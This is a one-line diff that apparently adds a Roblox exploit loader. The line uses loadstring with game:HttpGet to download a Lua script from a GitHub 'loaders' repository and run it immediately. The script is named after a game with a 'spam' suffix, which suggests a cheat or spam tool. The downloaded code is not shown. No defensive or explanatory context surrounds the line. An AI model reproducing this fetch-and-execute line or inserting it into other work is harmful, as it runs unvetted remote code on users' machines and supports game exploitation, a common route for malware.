@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/halloween-pt2-skibi-defense-spam7-061555wao7oq3w.lua"))()
